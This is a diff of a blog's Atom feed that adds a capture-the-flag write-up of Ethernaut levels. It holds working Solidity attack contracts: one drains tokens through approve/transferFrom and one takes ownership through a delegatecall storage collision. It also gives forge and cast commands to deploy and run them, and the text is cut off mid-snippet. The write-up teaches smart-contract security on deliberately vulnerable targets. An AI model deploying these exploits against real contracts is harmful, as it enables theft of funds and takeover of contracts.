@@ -5,7 +5,7 @@
   
   <link href="https://axucar.ca/feed.xml" rel="self" type="application/atom+xml" />
   <link href="https://axucar.ca/" rel="alternate" type="text/html" />
-  <updated>2022-09-14T05:00:51+00:00</updated>
+  <updated>2022-09-15T06:00:54+00:00</updated>
   <id>https://axucar.ca//</id>
 
   
@@ -18,6 +18,703 @@
 
   
 
+  
+  
+    <entry>
+      
+      <title type="html">Ethernaut Series: Part II</title>
+      
+      
+      <link href="https://axucar.ca/2022/09/14/ethernaut-series-2/" rel="alternate" type="text/html" title="Ethernaut Series: Part II" />
+      
+      <published>2022-09-14T00:00:00+00:00</published>
+      <updated>2022-09-14T00:00:00+00:00</updated>
+      <id>https://axucar.ca/2022/09/14/ethernaut-series-2</id>
+      <content type="html" xml:base="https://axucar.ca/2022/09/14/ethernaut-series-2/">&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#naught-coin&quot; id=&quot;markdown-toc-naught-coin&quot;&gt;Naught Coin&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#preservation&quot; id=&quot;markdown-toc-preservation&quot;&gt;Preservation&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#recovery&quot; id=&quot;markdown-toc-recovery&quot;&gt;Recovery&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#magicnumber&quot; id=&quot;markdown-toc-magicnumber&quot;&gt;MagicNumber&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#alien-codex&quot; id=&quot;markdown-toc-alien-codex&quot;&gt;Alien Codex&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#denial&quot; id=&quot;markdown-toc-denial&quot;&gt;Denial&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#shop&quot; id=&quot;markdown-toc-shop&quot;&gt;Shop&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#dex&quot; id=&quot;markdown-toc-dex&quot;&gt;Dex&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#dextwo&quot; id=&quot;markdown-toc-dextwo&quot;&gt;DexTwo&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#puzzle-wallet&quot; id=&quot;markdown-toc-puzzle-wallet&quot;&gt;Puzzle Wallet&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#motorbike&quot; id=&quot;markdown-toc-motorbike&quot;&gt;Motorbike&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#doubleentrypoint&quot; id=&quot;markdown-toc-doubleentrypoint&quot;&gt;DoubleEntryPoint&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#good-samaritan&quot; id=&quot;markdown-toc-good-samaritan&quot;&gt;Good Samaritan&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;This is the second half of the &lt;a href=&quot;https://ethernaut.openzeppelin.com/&quot;&gt;Ethernaut&lt;/a&gt; series notes on how I solved each level using Foundry. For the first half, please see the &lt;a href=&quot;http://axucar.ca/2022/09/13/ethernaut-series/&quot;&gt;previous post&lt;/a&gt;. The contracts deployed to solve the challenges, as well as test scripts, can be found on my &lt;a href=&quot;https://github.com/axucar/ethernaut-foundry/&quot;&gt;Github&lt;/a&gt;.&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;h1 id=&quot;naught-coin&quot;&gt;Naught Coin&lt;/h1&gt;
+
+&lt;p&gt;Since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NaughtCoin&lt;/code&gt; is an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ERC20&lt;/code&gt; token, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;transferFrom&lt;/code&gt; instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;transfer&lt;/code&gt; (see &lt;a href=&quot;https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#IERC20-transferFrom-address-address-uint256-&quot;&gt;Openzeppelin docs&lt;/a&gt;). Steps are:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Deploy attack contract below, which will send tokens via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;transferFrom&lt;/code&gt; from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msg.sender&lt;/code&gt; to another arbitrary address (e.g. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xA36f37e54180d59A9eC172d0f4A5F6c5Ba4F04A3&lt;/code&gt; in my case)
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forge create src/AttackNaughtCoin.sol:AttackNaughtCoin --verify --constructor-args &amp;lt;challenge_addr&amp;gt;&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Set a maximum allowance for the attacker to move funds on behalf of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;player&lt;/code&gt; by calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;contract.approve(spender,amount)&lt;/code&gt; on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NaughtCoin&lt;/code&gt; contract from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;player&lt;/code&gt;, where we set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spender&lt;/code&gt; to be the attacker contract we deployed
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cast send &amp;lt;challenge_addr&amp;gt; &quot;approve(address, uint256)&quot; &amp;lt;attacker_addr&amp;gt; 1000000000000000000000000&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;Note that we cannot call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;approve&lt;/code&gt; from the attack contract, since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;owner&lt;/code&gt; is defined as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msg.sender&lt;/code&gt; in the approve function of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ERC20.sol&lt;/code&gt;, which needs to be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;player&lt;/code&gt; (since only player has the tokens). After approving the attack contract with the transfer rights, we can use the attacker contract to move the funds.&lt;/li&gt;
+      &lt;li&gt;When we call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;contract.transferFrom(player,to,amount)&lt;/code&gt; inside the attack contract, it requires that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;contract.allowance(player, msg.sender)&lt;/code&gt; is large enough, ie. the signer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msg.sender&lt;/code&gt; has the rights to move funds. In this case, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msg.sender&lt;/code&gt; is the attack contract address&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;attack()&lt;/code&gt; on the attack contract
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cast send &amp;lt;attacker_addr&amp;gt; &quot;attack()&quot;&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;solidity&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;interface&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;INaughtCoin&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;balanceOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;account&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;view&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;returns&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;approve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;spender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;amount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;returns&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;transferFrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;amount&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;returns&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allowance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;owner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;spender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;view&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;returns&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AttackNaughtCoin&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;victim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;INaughtCoin&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_victim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;victim&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_victim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;        
+        &lt;span class=&quot;n&quot;&gt;nc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;INaughtCoin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;victim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;//beforehand, call NaughtCoin&apos;s approve(spender, amount) from msg.sender (the token holder)
+&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;//where spender is this attack contract, giving this contract permission to transfer out the player&apos;s tokens
+&lt;/span&gt;        &lt;span class=&quot;kt&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maxTokens&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;balanceOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;        
+        &lt;span class=&quot;n&quot;&gt;nc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;transferFrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA36f37e54180d59A9eC172d0f4A5F6c5Ba4F04A3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maxTokens&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;        
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;preservation&quot;&gt;Preservation&lt;/h1&gt;
+
+&lt;p&gt;The key is to notice that the storage variables layout between &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Library Contract&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Preservation&lt;/code&gt; did not match, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;timeZone1Library&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;timeZone2Library&lt;/code&gt; are both instances of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LibraryContract&lt;/code&gt;. This is an issue since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;timeZone1Library&lt;/code&gt; executes a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;delegatecall&lt;/code&gt; within &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setFirstTime()&lt;/code&gt;, which allows &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Preservation&lt;/code&gt; storage variables to be modified using the code of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LibraryContract&lt;/code&gt;.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setFirstTime()&lt;/code&gt; supposedly sets &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;storedTime&lt;/code&gt;. However, because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;delegatecall&lt;/code&gt; modifies the caller contract’s storage, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setFirstTime()&lt;/code&gt; actually sets &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;timeZone1Library&lt;/code&gt; since it is the first storage variable (as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;storedTime&lt;/code&gt; is also the first variable in storage in its corresponding environment). Hence, we can point &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;timeZone1Library&lt;/code&gt; to our own &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MaliciousLibrary&lt;/code&gt; instance&lt;/li&gt;
+  &lt;li&gt;Call the challenge contract’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setFirstTime()&lt;/code&gt; again, using any parameter (I chose 0), which we can use to set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;owner=tx.origin&lt;/code&gt;, again since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;delegatecall&lt;/code&gt; allows us to modify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Preservation&lt;/code&gt; contract’s storage&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;solidity&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MaliciousLibrary&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeZone1Library&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeZone2Library&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;owner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
+
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;setTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;owner&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;origin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;interface&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPreservation&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;    
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;owner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;returns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;setFirstTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_timeStamp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;external&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;     
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AttackPreservation&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;victim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;IPreservation&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    
+    &lt;span class=&quot;n&quot;&gt;MaliciousLibrary&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_victim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; 
+        &lt;span class=&quot;n&quot;&gt;victim&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_victim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   
+        &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MaliciousLibrary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;                        
+        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPreservation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;victim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setFirstTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint160&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))));&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setFirstTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;hr /&gt;
+&lt;h1 id=&quot;recovery&quot;&gt;Recovery&lt;/h1&gt;
+
+&lt;p&gt;Of course, we can use Etherscan to look at the deployed SimpleToken contract under Internal Txs. The more interesting alternative is to deterministically compute the “forgotten” contract address based on the address of the creator (sender) and the number of transactions the creator has sent (nonce). These parameters, sender and nonce, are RLP encoded and hashed with Keccak256.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Keep only the rightmost 160 bits = 40 hex digits from the 2+64 = 66-length hex, and append 0x to the front, to get the deployed contract address&lt;/li&gt;
+  &lt;li&gt;Below is the Javascript snippet (run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;node snippet.js&lt;/code&gt;):
+    &lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;encode&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rlp_encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;@ethersproject/rlp&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;keccak256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;@ethersproject/keccak256&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
